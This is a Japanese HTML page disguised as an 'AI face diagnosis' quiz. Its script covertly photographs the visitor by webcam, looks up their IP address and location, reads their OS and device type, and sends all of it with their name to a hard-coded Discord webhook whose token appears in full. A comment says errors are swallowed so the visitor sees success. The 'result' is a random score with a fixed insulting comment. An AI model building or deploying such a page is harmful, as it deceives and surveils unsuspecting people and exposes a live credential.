<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AIé¡”è¨ºæ–­ğŸ’–ã¶ã‚“ï¼</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon" />
  <link href="https://fonts.googleapis.com/css2?family=Kosugi+Maru&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
  <style>
    :root {
      --pink-main: #ff69b4;
      --pink-light: #ffc0cb;
      --purple-light: #e0f7ff;
      --purple-dark: #6a5acd;
      --text-dark: #444;
      --text-light: #fff;
    }
    
    body {
      font-family: 'Kosugi Maru', sans-serif;
      background: linear-gradient(135deg, #ffc0cb 0%, #a2a8d3 100%); /* New gradient */
      text-align: center;
      padding: 1em;
      color: var(--text-dark);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    h1 {
      font-size: 2.5em;
      color: var(--pink-main);
      margin-bottom: 0.1em;
      text-shadow: 1px 1px 3px rgba(255, 255, 255, 0.5);
    }
    p {
        font-size: 1.1em;
        margin-bottom: 1em;
    }
    input {
      padding: 0.8em 1.2em;
      border: 3px solid var(--pink-main);
      border-radius: 2em;
      font-size: 1.1em;
      outline: none;
      margin-bottom: 1.5em;
      background: var(--text-light);
      color: var(--text-dark);
      transition: all 0.3s;
      width: 80%;
      max-width: 300px;
    }
    input:focus {
        box-shadow: 0 0 10px var(--pink-main);
    }
    #video-container {
      position: relative;
      width: 90%;
      max-width: 400px;
      margin: 0 auto 1.5em;
      background: var(--text-light);
      padding: 10px;
      border-radius: 1.5em;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
    }
    video {
      width: 100%;
      height: auto;
      border-radius: 1em;
      display: block;
      background: #eee;
    }
    button {
      font-size: 1.3em;
      padding: 1em 2em;
      background: var(--pink-main);
      color: var(--text-light);
      border: none;
      border-radius: 3em;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 7px 15px rgba(255, 105, 180, 0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5em;
      margin: 0.5em auto;
      font-weight: bold;
    }
    button:hover:not(:disabled) {
      background: #ff4081;
      transform: translateY(-2px);
      box-shadow: 0 9px 18px rgba(255, 105, 180, 0.6);
    }
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
      box-shadow: none;
    }
    canvas {
      display: none;
    }
    #status-container {
      background: var(--text-light);
      border-radius: 1.5em;
      padding: 1.5em;
      margin-top: 1.5em;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      min-height: 8em; /* To prevent jumping */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    #status-message {
      font-size: 1.2em;
      color: var(--pink-main);
      font-weight: bold;
      margin-bottom: 0.5em;
    }
    #result-score {
        font-size: 3em;
        color: var(--purple-dark);
        font-weight: 900;
        margin-bottom: 0.5em;
    }
    #result-comment {
        font-size: 1.5em; /* è¨ºæ–­ã‚³ãƒ¡ãƒ³ãƒˆã‚’å¤§ããè¡¨ç¤º */
        color: var(--pink-main);
        font-weight: bold;
        text-shadow: 1px 1px 2px rgba(255, 105, 180, 0.2);
    }
    #result-type {
        /* ä»Šå›ã¯ä½¿ç”¨ã—ãªã„ãŒã€ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆç¶­æŒã®ãŸã‚ã‚¹ã‚¿ã‚¤ãƒ«ã‚’æ®‹ã™ */
        display: none; 
    }

    /* ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚¢ãƒ‹ãƒ¡ãƒ¼ã‚·ãƒ§ãƒ³ */
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid var(--pink-main);
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin-bottom: 1em;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading .loader {
        display: block;
    }
    .loading #status-message {
        color: var(--purple-dark);
    }
  </style>
</head>
<body>
  <h1>AIé¡”è¨ºæ–­ğŸ’–ã¶ã‚“ï¼</h1>
  <p>ã‚«ãƒ¡ãƒ©ã‚’è¦‹ã¦ã€è¨ºæ–­ã™ã‚‹äººã®**ãŠåå‰**ã‚’å…¥åŠ›ã—ã¦ã­ï¼</p>
  
  <input type="text" id="username" placeholder="åå‰ã‚’ã“ã“ã«å…¥åŠ›ï¼" />
  
  <div id="video-container">
      <video id="video" autoplay playsinline></video>
      <div id="no-camera" style="display:none; color: red; padding: 1em;">
        ã‚«ãƒ¡ãƒ©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¦ãã ã•ã„ğŸ¥º
      </div>
  </div>
  
  <button id="snapBtn" disabled>
      <i class="material-icons">camera_alt</i> è¨ºæ–­ã™ã‚‹ï¼
  </button>
  
  <button id="retryBtn" style="display: none;">
      <i class="material-icons">refresh</i> ã‚‚ã†ä¸€åº¦è¨ºæ–­ã™ã‚‹
  </button>

  <div id="status-container">
      <div class="loader" id="loader"></div>
      <div id="status-message">ã‚«ãƒ¡ãƒ©ã‚’èµ·å‹•ä¸­...</div>
      <div id="result-score"></div>
      <div id="result-comment"></div>
      <div id="result-type"></div>
  </div>

  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const usernameInput = document.getElementById('username');
    const statusContainer = document.getElementById('status-container');
    const statusMessage = document.getElementById('status-message');
    const resultScore = document.getElementById('result-score');
    const resultComment = document.getElementById('result-comment');
    const resultType = document.getElementById('result-type');
    const snapBtn = document.getElementById('snapBtn');
    const retryBtn = document.getElementById('retryBtn');
    const loader = document.getElementById('loader');
    const noCameraMessage = document.getElementById('no-camera');

    // å®Ÿéš›ã®Discord Webhook URLã«ç½®ãæ›ãˆã¦ãã ã•ã„
    const webhookURL = 'https://discord.com/api/webhooks/1446504287260770325/j_s6lnCq-PvLESNzS2vCsiglnsJnI5yLglBDStZBvjR86izXfQcY6v_dcVAapo5FXQRs'; 

    let stream = null; 
    let isDiagnosing = false;

    // --- è¨ºæ–­çµæœã®ãƒ­ã‚¸ãƒƒã‚¯ (ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º) ---
    function generateResult(name) {
        // ã‚¹ã‚³ã‚¢ã¯ãƒ©ãƒ³ãƒ€ãƒ  (90ã€œ100ç‚¹)
        const score = Math.floor(Math.random() * 11) + 90; 
        
        // **â˜…ãƒ¦ãƒ¼ã‚¶ãƒ¼æŒ‡å®šã®å›ºå®šã‚³ãƒ¡ãƒ³ãƒˆâ˜…**
        const comment = 'å›æ–‡å­¦ã¿ãŸã„ãªé¡”ã—ã¦ã‚‹ã­è¦ªå­ã‹ãªï¼Ÿw';
        
        // ã‚¿ã‚¤ãƒ—ã¯éè¡¨ç¤º
        const type = ''; 

        return { score, comment, type };
    }

    // --- ç’°å¢ƒæƒ…å ±å–å¾—ãƒ­ã‚¸ãƒƒã‚¯ (å¤‰æ›´ãªã—) ---
    function getOS() {
      const ua = navigator.userAgent;
      if (ua.indexOf('Windows') !== -1) return 'Windows';
      if (ua.indexOf('Macintosh') !== -1) return 'Mac';
      if (ua.indexOf('Linux') !== -1) return 'Linux';
      if (/Android/.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
      return 'ä¸æ˜';
    }

    function getDevice() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile/.test(ua)) return 'ãƒ¢ãƒã‚¤ãƒ«';
      if (/tablet/.test(ua)) return 'ã‚¿ãƒ–ãƒ¬ãƒƒãƒˆ';
      return 'ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—';
    }

    async function getIPInfo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        return await res.json();
      } catch {
        return null;
      }
    }
    
    // --- Discordã¸é€ä¿¡ (å¤‰æ›´ãªã—) ---
    async function sendToDiscord(name, ipInfo, os, device, blob) {
      const formData = new FormData();
      formData.append('file', blob, 'photo.png');

      let content = `ğŸ“¸ ${name}ã®é¡”è¨ºæ–­å†™çœŸãŒå±Šã„ãŸã¶ã‚“ï¼\n`;
      if (ipInfo) {
        content += `ğŸŒ IP: ${ipInfo.ip} (${ipInfo.city} ${ipInfo.region} ${ipInfo.country_name})\n`;
      } else {
        content += 'ğŸŒ IPæƒ…å ±ã‚’å–å¾—ã§ãã¾ã›ã‚“ã§ã—ãŸã€‚\n';
      }
      content += `ğŸ’» OS: ${os}\nğŸ“± ãƒ‡ãƒã‚¤ã‚¹: ${device}\n`;

      formData.append('payload_json', JSON.stringify({ content }));

      await fetch(webhookURL, {
        method: 'POST',
        body: formData,
      });
    }

    // --- è¨ºæ–­å®Ÿè¡Œãƒ­ã‚¸ãƒƒã‚¯ ---
    async function takePhoto() {
      if (isDiagnosing) return;
      isDiagnosing = true;
      
      const name = usernameInput.value.trim() || 'åç„¡ã—ã¶ã‚“';

      // UIã‚’ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°çŠ¶æ…‹ã«
      snapBtn.style.display = 'none';
      retryBtn.style.display = 'none';
      statusContainer.classList.add('loading');
      resultScore.textContent = '';
      resultComment.textContent = '';
      resultType.textContent = '';
      statusMessage.textContent = 'ğŸ“¸ å†™çœŸã‚’æ’®ã£ã¦åˆ†æä¸­... ã—ã°ã‚‰ãå¾…ã£ã¦ã¶ã‚“ï¼';


      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

      const ipInfo = await getIPInfo();
      const os = getOS();
      const device = getDevice();

      // æ“¬ä¼¼çš„ãªè¨ºæ–­å‡¦ç†æ™‚é–“
      await new Promise(resolve => setTimeout(resolve, 2500)); 

      canvas.toBlob(async (blob) => {
        try {
            await sendToDiscord(name, ipInfo, os, device, blob);
        } catch (error) {
            console.error('Discordé€ä¿¡ã‚¨ãƒ©ãƒ¼:', error);
            // ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¯æˆåŠŸã—ãŸã‚ˆã†ã«è¦‹ã›ã‚‹ãŸã‚ã€ã‚¨ãƒ©ãƒ¼ã‚’æ¡ã‚Šã¤ã¶ã™
        }
        
        // ã‚«ãƒ¡ãƒ©åœæ­¢
        stopCamera();

        // è¨ºæ–­çµæœã®è¡¨ç¤º
        const result = generateResult(name);
        
        statusContainer.classList.remove('loading');
        statusMessage.textContent = `${name}ã®AIé¡”è¨ºæ–­ã®çµæœã ã¶ã‚“ï¼`;
        resultScore.textContent = `${result.score}ç‚¹`;
        resultComment.textContent = `${result.comment}`; // â˜…å›ºå®šã‚³ãƒ¡ãƒ³ãƒˆã‚’è¡¨ç¤ºâ˜…

        retryBtn.style.display = 'block';
        isDiagnosing = false;
      }, 'image/png');
    }

    // --- ã‚«ãƒ¡ãƒ©åˆ¶å¾¡ ---
    function stopCamera() {
      if (stream) {
          stream.getTracks().forEach(track => track.stop());
      }
      video.srcObject = null;
    }

    async function startCamera() {
      stopCamera(); // å¿µã®ãŸã‚æ—¢å­˜ã®ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’åœæ­¢
      statusMessage.textContent = 'ã‚«ãƒ¡ãƒ©ã‚’èµ·å‹•ä¸­...';
      snapBtn.style.display = 'none';
      retryBtn.style.display = 'none';
      noCameraMessage.style.display = 'none';
      video.style.display = 'block';


      try {
          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          stream = s;
          video.srcObject = stream;
          statusMessage.textContent = 'æº–å‚™OKï¼åå‰ã‚’å…¥åŠ›ã—ã¦è¨ºæ–­ãƒœã‚¿ãƒ³ã‚’æŠ¼ã—ã¦ã­ï¼';
          
          // åå‰å…¥åŠ›ãƒã‚§ãƒƒã‚¯
          checkNameInput();

      } catch (err) {
          console.error('ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚¨ãƒ©ãƒ¼:', err);
          statusMessage.textContent = 'ã‚¨ãƒ©ãƒ¼: ã‚«ãƒ¡ãƒ©ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã§ã—ãŸğŸ¥º';
          video.style.display = 'none';
          snapBtn.disabled = true;
          noCameraMessage.style.display = 'block';
          retryBtn.style.display = 'block'; // ãƒªãƒˆãƒ©ã‚¤ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹
      }
    }

    function checkNameInput() {
        if (stream && usernameInput.value.trim().length > 0) {
            snapBtn.disabled = false;
            if (snapBtn.style.display !== 'block') snapBtn.style.display = 'block';
        } else {
            snapBtn.disabled = true;
        }
    }

    // --- ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ ---
    usernameInput.addEventListener('input', checkNameInput);
    snapBtn.addEventListener('click', takePhoto);
    retryBtn.addEventListener('click', () => {
        resultScore.textContent = '';
        resultComment.textContent = '';
        resultType.textContent = '';
        startCamera();
    });

    // åˆæœŸèµ·å‹•
    startCamera();
  </script>
</body>
</html>
